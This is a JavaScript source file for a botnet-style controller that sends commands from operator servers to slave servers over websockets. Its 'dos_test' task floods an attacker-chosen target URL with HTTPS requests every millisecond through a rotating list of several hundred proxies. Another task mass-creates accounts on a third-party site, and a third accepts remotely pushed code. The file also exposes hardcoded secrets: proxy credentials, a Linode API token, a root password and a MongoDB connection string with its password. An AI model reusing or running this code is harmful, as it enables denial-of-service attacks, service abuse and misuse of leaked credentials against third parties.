const AppVersion = "1.2.9"; // this is the version which will identify each server and make sure they're up to date!
let CurrentVersion = AppVersion; // Current version of the application, the master server sends this to all servers!
let NewAppCode = ""; // This'll be updated when the server sends out a new app version request!

const requestIp = require('request-ip');
const { TextEncoder, TextDecoder } = require("util"); // Util module for fixing stupid problems such as TextEncoder is undefined
const fs = require("fs"); // File module, used for creating and reading data aka files
const tunnel = require('tunnel'); // Used for tunneling our http requests through proxies :))
const Mongoose = require("mongoose"); // This is for our database / MongoDB
const DBModel = require("./Models/DB"); // Our database model so we can go through the database
const axios = require("axios"); // For http / https requests n so on
const ClientWebSocket = require("websocket").client; // This is for connecting to non server sockets and letting us listen for input from all servers and the operator!
const expressJS = require("express"); // For starting the server so we can connect web sockets etc
const ExpressWS = require("express-ws"); // Express web sockets
const ExpressApp = expressJS(); // Our express app
const ExpressWebSocket = ExpressWS(ExpressApp); // Our express websocket which contains a set of functions for collecting all connected clients etc!
const WebSocketInstance = ExpressWebSocket.getWss("/server_socket"); // Get the cached data of our worker web socket!
const Servers = {// We'll use the server IP to identify who it is, example: if the server is classed as operator it'll be the one to send out all the commands that the other servers will listen to!
    ["162.213.255.44"]: "operator",
    ["68.65.123.36"]: "operator",
    ["178.79.187.224"]: "slave",
    ["157.245.43.71"]: "slave",
    ["31.49.168.36"]: "slave"
};
const TaskList = { // We'll use this to over-ride tasks!
    "new_account": {Priority: 1, Task: "Account Creation"}
};
const InterVals = []; // Keep track of all inter vals so we can clear them on update.
const TaskDataInUse = []; // We'll use this to split certain tasks in half so each slave server can do them quicker
const CurrentTasks = []; // We'll store every servers current task in this so we don't constantly ask them to do anything while they're working!
const SocketIPs = []; // We'll store every IP that connected to a socket within this array to ensure we can filter out mass connections and save resources.
const DebugMode = true; // Enable this if you want log messages to be printed out, recommended to turn this off in production mode!
const AppPort = process.env.PORT || 7453; // Current web server port
const OperationKey = "S9v^3NX9pUsN!85EFx&Z1ZXnXer#R1Uwx6k%66H@#M3sjp^^BTMcfCJEQby2"; // The operation key which is used for authing message / new task requests!
const LocalHost = false; // This determines where to use a localhost connections which you shouldn't do when running on an actual server!
let DoingTask = false; // this will be set to true if this current server is doing a task provided by the master server
let LocalIP = null; // the current IP of this server, it gets auto set as soon as the server runs!
let CurrentClient = null; // This is the client which we'll use to send back messages to the master, will be set as soon as it connects to the master socket!
let StopConnection = false; // This is used for restarting the server, when set to true the socket won't try to reconnect. The master server tells the server to do this when outdated!
let CreateServers = true; // This is used for creating a butt load of servers!
let ClientConnected = false; // Used to determine if we should reconnect the socket
let ConnectionTime = 0; // Used for reconnecting sockets depending if the master server hasn't pinged for a short period of time!
let UsedProxies = 0;

let sProxies = [
    "209.127.191.180:9279:eutqpmhe:1vnz3gzykzgj",
    "45.142.28.83:8094:eutqpmhe:1vnz3gzykzgj",
    "45.136.231.43:7099:eutqpmhe:1vnz3gzykzgj",
    "45.137.60.112:6640:eutqpmhe:1vnz3gzykzgj",
    "45.136.228.85:6140:eutqpmhe:1vnz3gzykzgj",
    "45.140.13.124:9137:eutqpmhe:1vnz3gzykzgj",
    "45.136.231.85:7141:eutqpmhe:1vnz3gzykzgj",
    "193.8.56.159:9223:eutqpmhe:1vnz3gzykzgj",
    "45.140.13.112:9125:eutqpmhe:1vnz3gzykzgj",
    "45.142.28.20:8031:eutqpmhe:1vnz3gzykzgj"
]

let Proxies = [
    ["103.117.192.14:80"],
    ["113.252.11.250:8118"],
    ["124.204.33.162:8000"],
    ["80.82.215.6:80"],
    ["85.25.117.68:5566"],
    ["200.55.3.124:999"],
    ["120.220.220.95:8085"],
    ["51.68.82.156:8118"],
    ["77.52.187.199:10000"],
    ["85.25.198.20:5566"],
    ["106.54.128.253:999"],
    ["138.68.26.14:1081"],
    ["196.6.235.3:8080"],
    ["187.217.54.84:80"],
    ["177.126.151.162:8081"],
    ["43.255.113.232:8082"],
    ["103.154.30.166:8004"],
    ["47.102.193.144:8891"],
    ["188.138.90.226:5566"],
    ["91.219.183.135:8080"],
    ["107.151.182.247:80"],
    ["202.166.168.130:8080"],
    ["190.13.84.172:8080"],
    ["195.158.2.229:8080"],
    ["14.139.184.130:3128"],
    ["47.89.153.213:80"],
    ["103.142.108.149:8080"],
    ["118.70.12.171:53281"],
    ["179.61.229.163:999"],
    ["8.210.48.101:17673"],
    ["103.213.213.18:83"],
    ["151.22.181.213:8080"],
    ["188.234.216.66:49585"],
    ["79.120.177.106:8080"],
    ["45.114.118.81:3128"],
    ["103.139.242.210:82"],
    ["117.4.115.169:8080"],
    ["212.64.72.199:8080"],
    ["181.78.13.230:999"],
    ["103.154.230.58:8080"],
    ["201.149.100.32:8085"],
    ["61.7.138.152:8080"],
    ["190.95.156.166:999"],
    ["114.7.193.212:8080"],
    ["103.138.251.164:8080"],
    ["201.217.49.2:80"],
    ["37.224.60.172:8080"],
    ["80.78.246.65:3128"],
    ["191.97.19.93:999"],
    ["62.210.119.138:3128"],
    ["183.247.221.119:30001"],
    ["18.134.249.71:80"],
    ["160.251.14.122:3129"],
    ["8.210.48.101:17228"],
    ["47.119.152.33:22"],
    ["121.156.109.108:8080"],
    ["188.138.11.48:5566"],
    ["156.200.116.71:1976"],
    ["200.55.3.126:999"],
    ["128.199.202.122:8080"],
    ["184.183.3.211:8080"],
    ["109.183.189.238:53959"],
    ["119.93.129.34:80"],
    ["213.6.66.66:48687"],
    ["103.148.39.50:83"],
    ["182.253.189.244:8080"],
    ["131.100.51.45:999"],
    ["187.216.90.46:53281"],
    ["119.235.25.66:8010"],
    ["189.11.248.162:8080"],
    ["150.107.74.81:80"],
    ["8.210.48.101:17884"],
    ["117.54.114.101:80"],
    ["146.59.199.12:80"],
    ["41.65.236.44:1976"],
    ["94.23.91.209:80"],
    ["111.68.26.237:8080"],
    ["165.16.27.2:1981"],
    ["201.140.208.146:3128"],
    ["212.100.84.10:80"],
    ["85.25.91.156:5566"],
    ["181.196.241.198:9100"],
    ["183.81.156.130:8080"],
    ["179.61.229.164:999"],
    ["195.158.3.198:3128"],
    ["85.25.4.27:5566"],
    ["124.40.244.137:8080"],
    ["146.56.119.252:80"],
    ["180.178.111.220:8080"],
    ["103.156.75.45:8181"],
    ["94.139.185.210:8080"],
    ["185.23.110.106:8080"],
    ["200.91.223.125:8080"],
    ["5.131.243.11:8080"],
    ["45.224.119.16:999"],
    ["200.188.151.212:8080"],
    ["187.1.57.206:20183"],
    ["159.192.131.178:8080"],
    ["51.77.141.29:1081"],
    ["183.88.210.77:8080"],
    ["61.153.251.150:22222"],
    ["202.62.10.51:80"],
    ["122.3.41.154:8090"],
    ["168.90.14.162:999"],
    ["103.154.92.74:8080"],
    ["191.102.113.101:999"],
    ["103.78.75.91:8080"],
    ["103.125.162.134:82"],
    ["64.227.62.123:80"],
    ["103.213.213.22:83"],
    ["176.98.95.105:32018"],
    ["167.99.131.11:80"],
    ["176.88.63.126:8080"],
    ["181.205.41.210:7654"],
    ["167.99.174.59:80"],
    ["186.103.130.91:8080"],
    ["89.109.252.129:8080"],
    ["188.133.152.103:9080"],
    ["51.254.228.133:8000"],
    ["47.117.88.37:22"],
    ["103.146.185.110:3127"],
    ["202.51.114.210:3128"],
    ["91.217.42.2:8080"],
    ["8.210.48.101:18151"],
    ["34.140.87.13:80"],
    ["95.64.141.190:8080"],
    ["93.171.192.28:8080"],
    ["45.7.177.234:34234"],
    ["222.162.121.224:11223"],
    ["206.161.97.4:31337"],
    ["103.235.199.93:42033"],
    ["8.210.48.101:17379"],
    ["173.230.139.107:8080"],
    ["101.51.55.153:8080"],
    ["111.3.116.44:30001"],
    ["177.47.183.33:8080"],
    ["182.72.150.242:8080"],
    ["223.112.99.150:80"],
    ["36.94.174.244:8080"],
    ["41.65.236.53:1981"],
    ["103.144.77.213:8083"],
    ["190.110.99.99:999"],
    ["139.255.25.83:3128"],
    ["43.255.113.232:8083"],
    ["193.193.240.37:45944"],
    ["103.148.178.228:80"],
    ["158.69.67.129:5566"],
    ["122.165.157.74:8080"],
    ["202.62.84.210:53281"],
    ["147.135.38.83:24000"],
    ["202.4.116.242:8080"],
    ["77.236.243.125:1256"],
    ["59.124.224.205:3128"],
    ["139.255.26.115:8080"],
    ["186.159.23.154:8080"],
    ["103.69.38.1:8080"],
    ["103.4.167.46:8080"],
    ["18.228.40.250:7082"],
    ["190.119.199.21:57333"],
    ["41.65.236.37:1976"],
    ["187.144.242.38:3128"],
    ["102.68.128.216:8080"],
    ["103.159.46.14:84"],
    ["111.229.161.172:80"],
    ["185.58.16.127:8080"],
    ["85.25.72.91:5566"],
    ["139.255.94.122:39635"],
    ["5.188.136.52:8080"],
    ["85.117.56.151:8080"],
    ["190.106.49.250:8080"],
    ["14.17.106.202:3128"],
    ["180.250.204.91:8088"],
    ["79.143.30.163:8080"],
    ["103.145.35.30:8181"],
    ["167.71.228.163:3128"],
    ["149.56.185.173:80"],
    ["110.78.112.198:8080"],
    ["202.77.120.38:57965"],
    ["85.25.196.218:5566"],
    ["189.203.234.146:999"],
    ["81.91.137.43:8080"],
    ["103.71.61.217:8080"],
    ["134.0.63.134:8000"],
    ["103.155.166.242:8181"],
    ["81.15.242.73:8080"],
    ["177.242.151.142:8080"],
    ["176.119.158.31:8118"],
    ["46.221.4.222:9090"],
    ["89.165.40.12:8080"],
    ["154.236.184.79:1976"],
    ["196.1.95.117:80"],
    ["98.154.21.253:3128"],
    ["8.210.48.101:17701"],
    ["181.188.166.82:8080"],
    ["123.231.221.178:8080"],
    ["45.156.29.130:9090"],
    ["139.5.177.4:1081"],
    ["217.195.203.30:3128"],
    ["154.236.189.29:8080"],
    ["156.200.116.71:1981"],
    ["103.18.77.242:8080"],
    ["203.189.137.137:8080"],
    ["201.28.120.142:3128"],
    ["41.90.245.23:8080"],
    ["159.65.18.85:80"],
    ["95.167.29.50:8080"],
    ["47.102.215.165:8888"],
    ["200.101.66.170:8080"],
    ["85.25.108.234:5566"],
    ["117.102.72.66:8080"],
    ["136.185.15.104:8080"],
    ["173.82.149.243:8080"],
    ["186.195.82.9:8181"],
    ["78.186.99.214:10001"],
    ["62.33.8.148:8081"],
    ["202.62.10.51:8080"],
    ["8.210.48.101:17790"],
    ["37.48.82.87:3128"],
    ["170.239.221.36:8080"],
    ["85.25.119.241:5566"],
    ["190.109.122.197:999"],
    ["181.129.52.156:42648"],
    ["110.78.22.40:8080"],
    ["201.150.51.30:45005"],
    ["85.25.117.134:5566"],
    ["46.99.146.232:8080"],
    ["165.16.0.57:1981"],
    ["83.238.13.109:8080"],
    ["188.138.89.29:5566"],
    ["179.189.192.125:3129"],
    ["1.174.183.162:8080"],
    ["179.255.219.182:8080"],
    ["45.121.216.219:55443"],
    ["162.219.119.225:8080"],
    ["78.186.85.159:10001"],
    ["186.176.212.212:9080"],
    ["8.210.48.101:17343"],
    ["190.115.12.20:999"],
    ["37.187.146.176:8118"],
    ["80.93.212.46:3128"],
    ["132.145.195.93:3128"],
    ["200.24.132.205:6969"],
    ["164.163.12.50:8080"],
    ["186.47.83.126:80"],
    ["120.78.139.255:22"],
    ["202.40.177.69:80"],
    ["217.195.203.26:3128"],
    ["178.54.21.203:8081"],
    ["190.2.213.34:6969"],
    ["178.252.141.194:8080"],
    ["47.96.226.137:3128"],
    ["113.161.70.165:41890"],
    ["170.155.5.235:8080"],
    ["157.230.40.79:8080"],
    ["61.14.228.126:8080"],
    ["167.172.173.210:38959"],
    ["76.80.19.107:8080"],
    ["181.143.191.138:999"],
    ["45.233.244.140:8083"],
    ["192.162.192.148:55443"],
    ["182.237.16.7:82"],
    ["103.147.77.66:5009"],
    ["190.113.41.13:999"],
    ["77.236.248.237:8080"],
    ["101.132.134.206:22"],
    ["60.250.159.191:45983"],
    ["45.125.222.90:8080"],
    ["119.2.41.81:8080"],
    ["27.116.51.119:8080"],
    ["218.78.54.149:8901"],
    ["144.217.7.157:5566"],
    ["156.200.116.68:1976"],
    ["118.163.13.200:8080"],
    ["212.112.113.108:3128"],
    ["103.81.214.254:83"],
    ["54.36.180.244:1081"],
    ["202.152.51.44:8080"],
    ["177.93.50.5:999"],
    ["197.255.50.70:41890"],
    ["36.91.133.49:10000"],
    ["49.0.39.186:8080"],
    ["185.204.197.169:8080"],
    ["204.195.136.34:80"],
    ["181.224.255.39:8080"],
    ["41.128.148.76:1976"],
    ["103.159.90.42:84"],
    ["177.220.188.213:8080"],
    ["188.138.101.167:5566"],
    ["103.146.170.252:84"],
    ["103.130.106.65:83"],
    ["41.65.174.34:1981"],
    ["112.6.117.135:8085"],
    ["116.203.98.233:3128"],
    ["177.93.33.188:8080"],
    ["115.127.162.234:8080"],
    ["43.255.113.232:8081"],
    ["186.46.168.45:8080"],
    ["103.161.164.119:8181"],
    ["190.113.41.21:999"],
    ["180.152.114.41:9797"],
    ["122.155.165.191:3128"],
    ["52.168.34.113:80"],
    ["103.134.99.17:82"],
    ["197.159.133.254:3129"],
    ["36.95.84.151:41890"],
    ["41.60.232.125:34098"],
    ["103.119.144.4:55443"],
    ["45.184.155.14:999"],
    ["183.89.42.220:8080"],
    ["180.183.68.103:8080"],
    ["177.36.200.58:8080"],
    ["176.236.141.30:10001"],
    ["103.81.212.192:82"],
    ["85.221.247.234:8080"],
    ["85.25.95.117:5566"],
    ["62.75.229.155:5566"],
    ["190.107.232.138:999"],
    ["138.121.113.164:999"],
    ["36.90.103.23:8080"],
    ["45.156.31.20:9090"],
    ["164.52.207.80:80"],
    ["103.133.177.141:443"],
    ["41.229.253.214:8080"],
    ["140.246.129.38:8888"],
    ["183.88.215.252:8080"],
    ["188.133.158.145:8080"],
    ["167.249.180.42:8080"],
    ["89.111.104.109:41258"],
    ["187.102.236.209:999"],
    ["59.21.84.108:80"],
    ["165.22.218.125:3128"],
    ["36.94.27.124:8080"],
    ["85.25.199.122:5566"],
    ["202.146.228.254:8088"],
    ["177.222.118.37:8080"],
    ["85.234.38.247:3128"],
    ["47.119.133.82:8118"],
    ["81.68.243.42:80"],
    ["186.13.50.16:8080"],
    ["203.114.66.10:1337"],
    ["202.143.122.2:8080"],
    ["150.129.54.111:6666"],
    ["202.169.37.243:8080"],
    ["45.189.113.15:999"],
    ["200.106.184.12:999"],
    ["45.175.160.85:999"],
    ["161.97.123.237:3128"],
    ["186.97.172.178:60080"],
    ["45.127.99.240:8888"],
    ["202.159.101.44:8088"],
    ["190.90.242.208:999"],
    ["41.65.236.35:1976"],
    ["85.25.91.155:5566"],
    ["157.90.167.209:1081"],
    ["58.221.193.74:8888"],
    ["200.24.130.37:8080"],
    ["103.27.179.63:8888"],
    ["180.250.102.194:8080"],
    ["186.83.28.190:999"],
    ["37.61.220.234:1080"],
    ["103.156.17.63:8181"],
    ["185.103.168.77:8080"],
    ["202.180.19.41:8080"],
    ["103.137.84.18:83"],
    ["212.19.7.246:3128"],
    ["5.131.243.10:8080"],
    ["181.48.15.227:9991"],
    ["45.184.155.1:999"],
    ["105.112.135.162:8080"],
    ["200.125.171.202:9991"],
    ["103.164.200.227:82"],
    ["43.241.29.201:8080"],
    ["103.31.39.230:8080"],
    ["175.101.85.1:8080"],
    ["121.22.90.82:443"],
    ["190.185.116.161:999"],
    ["80.244.229.55:1256"],
    ["202.152.143.64:3128"],
    ["45.233.245.85:8083"],
    ["85.221.247.236:8080"],
    ["36.91.166.98:8080"],
    ["200.13.154.81:8080"],
    ["77.236.248.215:1256"],
    ["120.78.181.214:22"],
    ["187.109.40.9:20183"],
    ["123.56.13.137:80"],
    ["182.253.108.51:40448"],
    ["186.3.85.131:999"],
    ["185.208.102.155:8080"],
    ["202.43.190.10:53128"],
    ["93.184.8.74:8085"],
    ["41.174.179.147:8080"],
    ["43.255.113.232:8085"],
    ["36.94.142.163:8000"],
    ["103.162.205.251:8181"],
    ["200.114.79.27:999"],
    ["202.148.12.66:8080"],
    ["103.135.220.92:8080"],
    ["80.244.230.86:8080"],
    ["85.25.246.206:5566"],
    ["41.75.85.22:8080"],
    ["8.210.48.101:17161"],
    ["218.244.147.59:3128"],
    ["114.4.209.114:8080"],
    ["200.89.178.159:8080"],
    ["154.73.159.10:8585"],
    ["14.143.168.230:8080"],
    ["79.122.207.44:3128"],
    ["109.200.159.27:8080"],
    ["181.78.18.25:999"],
    ["119.82.239.37:8080"],
    ["103.213.105.190:8080"],
    ["43.224.8.14:6666"],
    ["212.42.116.161:8080"],
    ["158.140.190.242:55443"],
    ["112.6.117.178:8085"],
    ["203.142.71.52:8080"],
    ["8.210.48.101:18489"],
    ["193.31.27.123:80"],
    ["18.229.141.31:8888"],
    ["77.238.129.14:55443"],
    ["113.160.37.152:53281"],
    ["186.3.9.212:999"],
    ["102.66.163.239:5050"],
    ["218.80.71.27:8118"],
    ["103.130.4.25:55443"],
    ["188.138.106.133:5566"],
    ["27.72.149.205:8080"],
    ["118.163.120.181:58837"],
    ["212.92.204.54:80"],
    ["190.63.169.34:53281"],
    ["187.76.190.74:8080"],
    ["221.131.158.246:8888"],
    ["101.53.154.137:2018"],
    ["46.38.43.20:8082"],
    ["85.25.195.177:5566"],
    ["85.25.119.221:5566"],
    ["103.151.246.14:10001"],
    ["190.90.191.53:999"],
    ["45.184.25.77:8085"],
    ["77.70.35.87:37475"],
    ["121.22.90.90:443"],
    ["45.43.63.230:10001"],
    ["202.131.234.194:8080"],
    ["197.155.230.206:8080"],
    ["77.233.5.68:55443"],
    ["43.255.113.232:8084"],
    ["103.146.170.193:83"],
    ["177.11.24.220:8083"],
    ["188.133.152.247:1256"],
    ["101.132.186.39:9090"],
    ["34.159.44.143:3128"],
    ["110.235.249.226:8080"],
    ["103.164.113.211:8080"],
    ["36.66.16.193:8080"],
    ["122.154.35.190:8080"],
    ["188.138.89.50:5566"],
    ["103.159.46.18:82"],
    ["119.148.32.25:8080"],
    ["103.40.122.23:8087"],
    ["181.196.205.250:38178"],
    ["177.37.16.104:8080"],
    ["45.5.57.119:8080"],
    ["103.95.40.211:3128"],
    ["164.132.106.217:8087"],
    ["202.164.152.229:8080"],
    ["159.65.133.175:31280"],
    ["61.91.61.110:80"],
    ["103.239.200.186:1337"],
    ["186.3.9.211:999"],
    ["142.132.140.218:8082"],
    ["103.156.249.52:8080"],
    ["105.213.112.223:4415"],
    ["85.25.198.22:5566"],
    ["103.163.134.5:8181"],
    ["115.74.246.138:8080"],
    ["182.253.93.4:53281"],
    ["85.25.208.198:5566"],
    ["103.159.47.9:84"],
    ["177.242.151.136:8080"],
    ["212.115.232.79:31280"],
    ["85.25.155.103:5566"],
    ["36.95.34.106:8080"],
    ["196.1.97.209:80"],
    ["190.119.195.34:8080"],
    ["181.48.243.242:8080"],
    ["190.121.153.93:999"],
    ["103.10.62.238:61124"],
    ["77.236.230.177:1256"],
    ["185.82.99.123:9091"],
    ["50.233.228.147:8080"],
    ["102.141.197.17:8080"],
    ["103.134.97.225:82"],
    ["188.133.173.21:8080"]
]

ExpressApp.use(requestIp.mw())
ExpressApp.use(expressJS.json())

const agent = tunnel.httpsOverHttp({
    proxy: {
        host: '209.127.191.180',
        port: 9279,
        proxyAuth: `eutqpmhe:1vnz3gzykzgj`
    }
});

/*
setInterval(() => {
    if (UsedProxies >= Proxies.length){
        UsedProxies = 0;
    }

    const Proxys = Proxies[UsedProxies]

    if (Proxys){
        UsedProxies += 1

        const ProxyData = Proxys.toString().split(":");
        console.log(ProxyData)
        const agent = tunnel.httpsOverHttp({
            proxy: {
                host: ProxyData[0],
                port: Math.floor(ProxyData[1]),
                proxyAuth: `${(typeof ProxyData[2] != "undefined") ? ProxyData[2] : ""}:${(typeof ProxyData[3] != "undefined") ? ProxyData[3] : ""}`
            }
        });
        
        try{
            if (typeof agent != "undefined"){
                axios.get("https://nettarget.xyz", {
                    httpsAgent: agent,
                    port: 443
                }).then((res) => {
                    console.log("sent", ProxyData[0])
                }).catch((ee) => {})
            }
        }catch (fail_){
            console.log("Failed to send request")
        }
    }
}, 500)*/

/*
axios.get("https://cloud.linode.com/api/v4/linode/instances/?page_size=100", {
    headers: {
        authorization: "Bearer 6f6fd2b137c17bb571dc4e7bbd8a4b9d7c1145e34d2e3adc38f86f51cc839175"
    }
}).then((res) => {
    console.log(res.data)
    
}).catch((re) => {
    console.log(re, "bad man error 1")
})

for (let II = 1; II <= 10; II++){
    axios({
        method: "POST",
        headers: {
            'Content-Type' : 'application/json',
            'Accept' : 'application/json',
            'Authorization' : 'Bearer 6f6fd2b137c17bb571dc4e7bbd8a4b9d7c1145e34d2e3adc38f86f51cc839175',
            'cookie': ""
        },
    
        withCredentials: true,
        url: "https://cloud.linode.com/api/v4/linode/instances",
    
        data:{
            ["image"]: "linode/centos7",
            ["region"]: "eu-west",
            ["type"]: "g6-standard-1",
            ["label"]: `server${II.toString()}-eu-west`,
            ["tags"]: [],
            ["root_pass"]: "aeP@9WYX&UzUdjJB2!j96tx5",
            ["authorized_users"]: [],
            ["booted"]: true,
            ["backups_enabled"]: false,
            ["private_ip"]: false
        }
    }).then((res) => {
        console.log("we did it 1")
        
    }).catch((re) => {
    })
}

*/

try{
    axios.get("https://api.ipify.org/?format=json").then((Response) => {
        LocalIP = Response.data.ip

        const PC_RANK = (typeof Servers[LocalIP] != "undefined") ? Servers[LocalIP] : "unknown"

        let NewFile = (new Date() / 1000).toString()

        if (DebugMode){
            fs.writeFileSync(`CONSOLE_LOGS/${NewFile}.log`, "")
        }

        let ToLog = ""
        let ConsoleLogIndex = 0
        
        async function ConsoleLogger(...args){
            if (DebugMode){
                let NewPrinter = ""

                await args.forEach((Value, Index) => {
                    const Middle1 = (Index == 0) ? "" : "\n"
                    const Middle2 = (ConsoleLogIndex == 0) ? "" : "\n"
            
                    NewPrinter = NewPrinter + Middle1 + Value.toString()
                    ToLog = ToLog + Middle2 + Value.toString()
                    ConsoleLogIndex += 1
                })

                console.log(NewPrinter)
            }
        }

        setInterval(() => {
            if (DebugMode){
                fs.writeFileSync(`CONSOLE_LOGS/${NewFile}.log`, `${ToLog}`)
            }
        }, 1000);

        function GetSlaveIP(Client){
            for (const [CLIENT_IP, CLIENT_SOCKET] of Object.entries(SocketIPs)) {
                if (CLIENT_SOCKET == Client){
                    return CLIENT_IP.toString()
                }
            }
            return null
        }

        function GetSlaveServers(){
            const Slaves = [];

            for (const [ServerIP, ServerRank] of Object.entries(Servers)) {
                if (ServerRank == "slave"){
                    Slaves.push(ServerIP.toString())
                }
            }

            return Slaves
        }

        function SplitTableUp(table){ // it works but it's also ass at the same time, but it'll do for now LOL
            const NewArray = []

            if (typeof table == "object"){
                const BackUpObject = table; // A backup of the main object so we don't overwrite the original
                let BackUpLength = BackUpObject.length;

                for (let _I = 0; _I <= BackUpLength; _I++){
                    const AmountToTake = Math.floor(BackUpObject.length / GetSlaveServers().length); // that moment I keep using lua instructions by mistake because my main is lua
                    const NewObject = [];

                    for (let AmountIndex = 0; AmountIndex < AmountToTake; AmountIndex++){
                        NewObject.push(BackUpObject[AmountIndex]) // Push that data into our new object
                    }

                    BackUpObject.splice(0, AmountToTake) // we also needa remove data from our backup object so we don't keep adding that same data into the new object

                    if (_I >= BackUpLength){ // if hit the max limit
                        if (BackUpObject.length > 0){
                            NewArray.push(BackUpObject) // push our new object into the split object!
                        }
                    }

                    if (NewObject.length > 0){ // Don't wanna be pushing empty objects
                        NewArray.push(NewObject) // push our new object into the split object!
                    }
                }

            }

            return NewArray
        }

        ConsoleLogger(SplitTableUp([ // 6 tasks
            "wow1",
            "wow2",
            "wow3",
            "wow4",
            "wow5",
            "wow6"
        ]))
    
        async function Encrypt(Data, Salt){ // New encryption / cypher
            let currentPass = input.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);});
        }// wrong file brudda
    
        async function Decrypt(Data, Salt){ // New encryption / cypher

        }
    
        function IsDoingTask(Client){
            let clientIp1 = GetSlaveIP(Client)
            if (typeof clientIp1 != "undefined"){
                clientIp1 = clientIp1.replace("::ffff:", "")
            }
            if (typeof CurrentTasks[clientIp1] != "undefined"){
                if (CurrentTasks[clientIp1] == true){
                    return true
                }
            }

            return false
        }

        function TaskHandler(Client, Message){
            try{
                let clientIp1 = GetSlaveIP(Client)
                clientIp1 = clientIp1.replace("::ffff:", "")

                const JSON_DATA = JSON.parse(Message) // Convert our data back into a array / class

                if (JSON_DATA){ // Make sure the data is valid and not null
                    if (typeof JSON_DATA.doing_task != "undefined"){ // Make sure the command and auth key is valid and not null
                        CurrentTasks[clientIp1] = JSON_DATA.doing_task
                    }
                }else{
                    ConsoleLogger("json invalid")
                }
            }catch (task_error){
                ConsoleLogger("[SERVER] -> [ERROR] -> error while executing task handler, " + task_error);
            }
        }

        function CompareRank(Client){
            let clientIp1 = GetSlaveIP(Client)
            if (typeof clientIp1 != "undefined"){
                clientIp1 = clientIp1.replace("::ffff:", "")
            }

            const IP_RANK = (typeof Servers[clientIp1] != "undefined") ? Servers[clientIp1] : "unknown"

            if (IP_RANK == "operator"){
                return true
            }

            return false
        }

        async function CommandHandler(Message){
            
            try{
                const JSON_DATA = JSON.parse(Message) // Convert our data back into a array / class

                if (JSON_DATA){ // Make sure the data is valid and not null
                    if (typeof JSON_DATA.AuthKey != "undefined"){ // Make sure the command and auth key is valid and not null
                        if (JSON_DATA.AuthKey == OperationKey){ // Compare the auth key provided to the servers auth key to make sure they have access to run such commands!
                            //
                            switch((typeof JSON_DATA.type != "undefined") ? JSON_DATA.type : ""){
                                case "task": {
                                    if (JSON_DATA.command == "dos_test" & JSON_DATA.type == "task" & typeof JSON_DATA.target_url != "undefined"){
                                        if (DoingTask == true) { return true }

                                        DoingTask = true;

                                        if (CurrentClient){
                                            CurrentClient.send(JSON.stringify({
                                                doing_task: true
                                            }));
                                        }

                                        let DOS_ID = null
                                        ConsoleLogger("Sending requests!")
                                        DOS_ID = setInterval(() => {
                                            if (typeof InterVals[DOS_ID] == "undefined"){
                                                InterVals[DOS_ID] = DOS_ID
                                            }

                                            if (UsedProxies >= Proxies.length){
                                                UsedProxies = 0;
                                            }
                                            
                                            const Proxys = Proxies[UsedProxies]
                                            
                                            if (Proxys){
                                                UsedProxies += 1
                                            
                                                const ProxyData = Proxys.toString().split(":");

                                                const aSgent = tunnel.httpsOverHttp({
                                                    proxy: {
                                                        host: ProxyData[0],
                                                        port: Math.floor(ProxyData[1]),
                                                        proxyAuth: `${(typeof ProxyData[2] != "undefined") ? ProxyData[2] : ""}:${(typeof ProxyData[3] != "undefined") ? ProxyData[3] : ""}`
                                                    }
                                                });

                                                axios.get(JSON_DATA.target_url, {
                                                    httpsAgent: aSgent
                                                }).then((res) => {
                                                }).catch((request_error) => {})
                                            }
                                        }, 1)
                                    }

                                    if (JSON_DATA.command == "new_account" & JSON_DATA.type == "task"){
                                        if (DoingTask == true) { return true }
                                        //
                                        DoingTask = true;
                                        CurrentClient.send(JSON.stringify({
                                            doing_task: true
                                        }));
    
                                        if (typeof JSON_DATA.total != "undefined"){
                                            let Finished = true;
                                            let InterID = null;
                                            let CurrentIndex = 0;
    
                                            InterID = setInterval(async () => {
                                                if (typeof InterVals[InterID] == "undefined"){
                                                    InterVals[InterID] = InterID
                                                }

                                                if (JSON_DATA.total == CurrentIndex){
                                                    DoingTask = false;
                                                    ConsoleLogger("Task completed!");
    
                                                    CurrentClient.send(JSON.stringify({
                                                        doing_task: false
                                                    }));
    
                                                    return clearInterval(InterID);
                                                }
    
                                                if (Finished){
                                                    Finished = false;
                                                    
                                                    await axios.get("https://rbxidle.com/public/api/qsawqa/init", {
                                                        headers: {
                                                            ['User-Agent']: 'Chrome',
                                                        },
                                                        httpsAgent: agent,
                                                        port: 443,
                                                    }).then(async (Response) => {
                                                        const newRecord = new DBModel({
                                                            PrivateKey: Response.data.pkey,
                                                            User: Response.data.name,
                                                            Points: 0
                                                        });
    
                                                        await newRecord.save();
    
                                                        setTimeout(() => {
                                                            Finished = true
                                                        }, 1000);
    
                                                        CurrentIndex += 1
                                                    }).catch((bad_man_error) => {
                                                        ConsoleLogger(bad_man_error);
                                                        setTimeout(() => {
                                                            Finished = true
                                                        }, 10000);
                                                    })
                                                }
                                            }, 20);
                                        }
                                        //
                                    }

                                } // Task case end bracket

                                case "connection_time":{
                                    if (JSON_DATA.type == "connection_time"){
                                        ConnectionTime = new Date();
                                    }
                                }

                                case "app_version":{
                                    if (JSON_DATA.type == "app_version"){
                                        if (typeof JSON_DATA.data != "undefined"){
                                            NewAppCode = Buffer.from(JSON_DATA.data.app_file, 'base64').toString("ascii");
                                            CurrentVersion = JSON_DATA.data.version;
                                        }
                                    }
                                } // app version case end bracket

                            }// Switch statement end bracket
                            //
                        }
                    }
                }else{
                    ConsoleLogger("json invalid");
                }
            }catch (cmd_error){
                ConsoleLogger("[SERVER] -> [ERROR] -> error while executing command, " + cmd_error);
            }
        }
    
        function StopTasks(){
            for (const [VAL_ID, VAL_OBJECT] of Object.entries(InterVals)){
                clearInterval(VAL_OBJECT);
                InterVals[VAL_ID] = null || undefined;
            };
        }

        function InputHandler(Message, ServerRank){
            if (ServerRank == "operator"){
                // This'll execute commands and send inputs to all the servers!
                
                WebSocketInstance.clients.forEach((Worker) => { // Go through the clients list grabbing each client 1 by 1
                    if (!CompareRank(Worker)){ // Stops it from sending a message to the operator!
                        if (!IsDoingTask(Worker)){ // Check if the slave / server is preforming a task, if not then tell it do a task!
                            Worker.send(Message); // Send the worker a nice little message to do it's slave work
                        }
                    }
                });
            }else if (ServerRank == "slave"){
                // This'll take the input cmd and do whatever we want
                CommandHandler(Message);
            };
        };

        Mongoose.connect("mongodb+srv://miningyay:66oPfMujoKaHbjKD@miningthing.4aen9.mongodb.net/test", {
            useNewUrlParser: true,
            useUnifiedTopology: true
        }).then(async (Client) => {
